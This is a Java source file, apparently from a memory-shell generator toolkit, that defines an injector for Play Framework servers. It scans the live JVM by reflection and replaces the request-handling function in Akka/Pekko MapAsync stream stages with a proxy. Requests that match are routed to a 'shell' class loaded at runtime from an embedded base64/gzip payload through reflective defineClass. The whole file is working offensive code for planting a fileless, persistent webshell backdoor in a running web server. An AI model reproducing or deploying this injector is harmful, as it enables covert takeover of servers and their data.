package com.reajason.javaweb.playframework.injector;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.lang.reflect.Proxy;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Collections;
import java.util.HashMap;
import java.util.IdentityHashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.zip.GZIPInputStream;

/**
 * Replaces the {@code f} field of the Akka/Pekko Streams {@code MapAsync} stages that drive
 * the Play HTTP server. Every request handler invocation reads that field through the running
 * stage logic, so swapping it installs a pass-through proxy without touching the stream graph.
 *
 * <p>The injector is its own {@link InvocationHandler}: one proxy per stage is registered in
 * {@code originals}, which keeps the generated artifact a single class with no inner classes
 * to ship alongside it.
 *
 * <p>All Akka and Pekko types are reached reflectively. The plugin must not compile against
 * either runtime, and the same class is injected into both.
 */
public final class PlayHandlerInjector implements InvocationHandler {

    private static final String[] MAP_ASYNC_CLASSES = {
            "akka.stream.impl.fusing.MapAsync",
            "akka.stream.impl.fusing.MapAsyncUnordered",
            "org.apache.pekko.stream.impl.fusing.MapAsync",
            "org.apache.pekko.stream.impl.fusing.MapAsyncUnordered"
    };

    private static final String[] HTTP_REQUEST_CLASSES = {
            "akka.http.scaladsl.model.HttpRequest",
            "org.apache.pekko.http.scaladsl.model.HttpRequest"
    };

    private static final String[] ACTOR_SYSTEM_CLASSES = {
            "akka.actor.ActorSystemImpl",
            "org.apache.pekko.actor.ActorSystemImpl"
    };

    private static final String[] MATERIALIZER_INTERFACES = {
            "akka.stream.Materializer",
            "org.apache.pekko.stream.Materializer"
    };

    private static final int MAX_VISITED = 1000000;
    private static final int MAX_ARRAY_ITEMS = 4096;
    private static final long MAX_SCAN_MILLIS = 15000L;

    private final Map<Object, Object> originals =
            Collections.synchronizedMap(new IdentityHashMap<Object, Object>());
    private final Map<Object, Object[]> tasks =
            Collections.synchronizedMap(new IdentityHashMap<Object, Object[]>());
    private final Map<Class<?>, Field[]> fieldCache = new HashMap<Class<?>, Field[]>();

    private Object shell;
    private Object materializer;
    private Object actorSystem;
    private ClassLoader targetLoader;
    private volatile Method shellHandle;
    private volatile Method shellMatches;
    private volatile Method functionApply;
    private volatile Object promiseModule;
    private volatile Method promiseApply;
    private volatile Method promiseFuture;
    private volatile Method promiseSuccess;
    private volatile Method promiseCompleteWith;
    private int replaced;
    private boolean failureLogged;

    public PlayHandlerInjector() {
        try {
            inject();
        } catch (Throwable e) {
            log(e);
        }
    }

    public String getUrlPattern() {
        return "/*";
    }

    public String getClassName() {
        return "";
    }

    public String getBase64String() {
        return "";
    }

    private void inject() throws Exception {
        targetLoader = Thread.currentThread().getContextClassLoader();
        if (targetLoader == null) {
            targetLoader = PlayHandlerInjector.class.getClassLoader();
        }
        shell = loadShell();
        scan();
        if (materializer == null && actorSystem != null) {
            materializer = materializerFrom(actorSystem);
        }
        System.out.println("[playframework] injected into " + replaced + " MapAsync stage(s)"
                + (materializer == null ? " (materializer not found)" : ""));
    }

    private Object loadShell() throws Exception {
        try {
            return Class.forName(getClassName(), true, targetLoader).getDeclaredConstructor().newInstance();
        } catch (ClassNotFoundException notInjectedYet) {
            byte[] shellBytes = decompress(Base64.getDecoder().decode(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod(
                    "defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class<?> shellClass = (Class<?>) defineClass.invoke(targetLoader, shellBytes, 0, shellBytes.length);
            return shellClass.getDeclaredConstructor().newInstance();
        }
    }

    private void scan() {
        List<Object> roots = new ArrayList<Object>();
        roots.add(Thread.currentThread());
        for (Thread thread : Thread.getAllStackTraces().keySet()) {
            String name = thread.getClass().getName();
            if (name.contains("MonitorableThread") || name.contains("ForkJoinWorkerThread")) {
                roots.add(thread);
            }
        }

        Set<Object> visited = Collections.newSetFromMap(new IdentityHashMap<Object, Boolean>());
        ArrayDeque<Object> queue = new ArrayDeque<Object>();
        for (Object root : roots) {
            if (root != null) {
                queue.add(root);
            }
        }

        long deadline = System.currentTimeMillis() + MAX_SCAN_MILLIS;
        int visitedCount = 0;
        while (!queue.isEmpty() && visitedCount < MAX_VISITED) {
            if ((visitedCount & 1023) == 0 && System.currentTimeMillis() > deadline) {
                break;
            }
            Object object = queue.poll();
            if (object == null || !visited.add(object)) {
                continue;
            }
            visitedCount++;

            Class<?> type = object.getClass();
            if (type.isArray()) {
                enqueueArray(queue, object);
                continue;
            }
            String typeName = type.getName();
            if (isOneOf(typeName, MAP_ASYNC_CLASSES)) {
                replaceF(object);
                continue;
            }
            if (materializer == null && typeName.contains("Materializer") && implementsAny(type, MATERIALIZER_INTERFACES)) {
                materializer = object;
            }
            if (actorSystem == null && isOneOf(typeName, ACTOR_SYSTEM_CLASSES)) {
                actorSystem = object;
            }
            for (Field field : fieldsOf(type)) {
                try {
                    Object value = field.get(object);
                    if (value != null && traversable(value.getClass())) {
                        queue.add(value);
                    }
                } catch (Throwable ignored) {
                    // inaccessible JDK/third-party internals are not on the path we need
                }
            }
        }
    }

    private void enqueueArray(ArrayDeque<Object> queue, Object array) {
        Class<?> component = array.getClass().getComponentType();
        if (component.isPrimitive()) {
            return;
        }
        int length = Math.min(java.lang.reflect.Array.getLength(array), MAX_ARRAY_ITEMS);
        for (int i = 0; i < length; i++) {
            try {
                Object value = java.lang.reflect.Array.get(array, i);
                if (value != null && traversable(value.getClass())) {
                    queue.add(value);
                }
            } catch (Throwable ignored) {
                return;
            }
        }
    }

    private void replaceF(Object stage) {
        try {
            Field f = findField(stage.getClass(), "f");
            if (f == null) {
                return;
            }
            f.setAccessible(true);
            Object original = f.get(stage);
            if (original == null || Proxy.isProxyClass(original.getClass())) {
                return;
            }
            Class<?> functionType = f.getType();
            if (!functionType.isInterface()) {
                return;
            }
            Object proxy = Proxy.newProxyInstance(
                    functionType.getClassLoader(), new Class<?>[]{functionType}, this);
            originals.put(proxy, original);
            f.set(stage, proxy);
            replaced++;
        } catch (Throwable ignored) {
            // one stage failing must not abort the remaining stream graphs
        }
    }

    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        Object[] task = tasks.remove(proxy);
        if (task != null && "run".equals(method.getName())) {
            runTask(task);
            return null;
        }
        Object original = originals.get(proxy);
        if (original == null) {
            return null;
        }
        if ("apply".equals(method.getName()) && args != null && args.length == 1
                && isHttpRequest(args[0]) && matches(args[0])) {
            return handleAsync(original, args[0]);
        }
        try {
            return functionApplyMethod().invoke(original, args);
        } catch (InvocationTargetException e) {
            throw e.getCause();
        }
    }

    private boolean matches(Object request) {
        try {
            if (shellMatches == null) {
                shellMatches = shell.getClass().getDeclaredMethod("matches", Object.class);
                shellMatches.setAccessible(true);
            }
            return Boolean.TRUE.equals(shellMatches.invoke(shell, request));
        } catch (Throwable e) {
            log(e);
            return false;
        }
    }

    /**
     * Shell handling blocks on entity materialization, so it runs on its own thread: Play 2.8's
     * dispatcher is small enough that blocking it inside the MapAsync callback deadlocks the
     * very stream that has to feed the request entity.
     */
    private Object handleAsync(Object original, Object request) throws Exception {
        ensurePromise();
        Object promise = promiseApply.invoke(promiseModule);
        Runnable runnable = (Runnable) Proxy.newProxyInstance(
                Runnable.class.getClassLoader(), new Class<?>[]{Runnable.class}, this);
        tasks.put(runnable, new Object[]{original, request, promise});
        Thread worker = new Thread(runnable, "play-shell");
        worker.setDaemon(true);
        worker.start();
        return promiseFuture.invoke(promise);
    }

    private void runTask(Object[] task) {
        Object original = task[0];
        Object request = task[1];
        Object promise = task[2];
        Thread thread = Thread.currentThread();
        ClassLoader previous = thread.getContextClassLoader();
        if (targetLoader != null) {
            thread.setContextClassLoader(targetLoader);
        }
        try {
            Object response = handle(request);
            if (response != null) {
                promiseSuccess.invoke(promise, response);
            } else {
                completeWith(promise, original, request);
            }
        } catch (Throwable e) {
            log(e);
            try {
                completeWith(promise, original, request);
            } catch (Throwable ignored) {
                // the promise is already completed
            }
        } finally {
            thread.setContextClassLoader(previous);
        }
    }

    private void completeWith(Object promise, Object original, Object request) throws Exception {
        Object future = functionApplyMethod().invoke(original, request);
        promiseCompleteWith.invoke(promise, future);
    }

    private Method functionApplyMethod() throws Exception {
        if (functionApply == null) {
            functionApply = Class.forName("scala.Function1", true, targetLoader).getMethod("apply", Object.class);
        }
        return functionApply;
    }

    private synchronized void ensurePromise() throws Exception {
        if (promiseModule != null) {
            return;
        }
        Class<?> module = Class.forName("scala.concurrent.Promise$", true, targetLoader);
        Class<?> promise = Class.forName("scala.concurrent.Promise", true, targetLoader);
        Class<?> future = Class.forName("scala.concurrent.Future", true, targetLoader);
        promiseApply = module.getMethod("apply");
        promiseFuture = promise.getMethod("future");
        promiseSuccess = promise.getMethod("success", Object.class);
        promiseCompleteWith = promise.getMethod("completeWith", future);
        promiseModule = module.getField("MODULE$").get(null);
    }

    private Object handle(Object request) {
        try {
            if (shellHandle == null) {
                shellHandle = shell.getClass().getDeclaredMethod("handle", Object.class, Object.class);
                shellHandle.setAccessible(true);
            }
            return shellHandle.invoke(shell, request, materializer);
        } catch (Throwable e) {
            log(e);
            return null;
        }
    }

    private Object materializerFrom(Object system) {
        try {
            String prefix = system.getClass().getName().startsWith("org.apache.pekko.") ? "org.apache.pekko" : "akka";
            Class<?> moduleClass = Class.forName(prefix + ".stream.Materializer$", true, targetLoader);
            Object module = moduleClass.getField("MODULE$").get(null);
            for (Method method : moduleClass.getMethods()) {
                if ("matFromSystem".equals(method.getName()) && method.getParameterCount() == 1) {
                    return method.invoke(module, system);
                }
            }
        } catch (Throwable ignored) {
            // the scan may still have captured a concrete materializer instance
        }
        return null;
    }

    private Field[] fieldsOf(Class<?> type) {
        Field[] cached = fieldCache.get(type);
        if (cached != null) {
            return cached;
        }
        List<Field> fields = new ArrayList<Field>();
        for (Class<?> current = type; current != null && current != Object.class; current = current.getSuperclass()) {
            for (Field field : current.getDeclaredFields()) {
                if (Modifier.isStatic(field.getModifiers()) || field.getType().isPrimitive()) {
                    continue;
                }
                try {
                    field.setAccessible(true);
                } catch (Throwable ignored) {
                    continue;
                }
                fields.add(field);
            }
        }
        Field[] result = fields.toArray(new Field[0]);
        fieldCache.put(type, result);
        return result;
    }

    private static Field findField(Class<?> type, String name) {
        for (Class<?> current = type; current != null && current != Object.class; current = current.getSuperclass()) {
            try {
                return current.getDeclaredField(name);
            } catch (NoSuchFieldException ignored) {
                // keep walking the hierarchy
            }
        }
        return null;
    }

    private static boolean implementsAny(Class<?> type, String[] interfaceNames) {
        for (Class<?> current = type; current != null; current = current.getSuperclass()) {
            for (Class<?> iface : current.getInterfaces()) {
                for (String name : interfaceNames) {
                    if (name.equals(iface.getName())) {
                        return true;
                    }
                }
            }
        }
        return false;
    }

    private static boolean traversable(Class<?> type) {
        return type != String.class && type != Class.class && !type.isEnum()
                && !Number.class.isAssignableFrom(type) && type != Boolean.class
                && type != Character.class && !type.isPrimitive();
    }

    private static boolean isHttpRequest(Object value) {
        return value != null && isOneOf(value.getClass().getName(), HTTP_REQUEST_CLASSES);
    }

    private static boolean isOneOf(String value, String[] candidates) {
        for (String candidate : candidates) {
            if (candidate.equals(value)) {
                return true;
            }
        }
        return false;
    }

    private static byte[] decompress(byte[] compressed) throws IOException {
        try (GZIPInputStream input = new GZIPInputStream(new ByteArrayInputStream(compressed));
             ByteArrayOutputStream output = new ByteArrayOutputStream()) {
            byte[] buffer = new byte[4096];
            int read;
            while ((read = input.read(buffer)) > 0) {
                output.write(buffer, 0, read);
            }
            return output.toByteArray();
        }
    }

    private void log(Throwable throwable) {
        if (failureLogged) {
            return;
        }
        failureLogged = true;
        throwable.printStackTrace();
    }
}
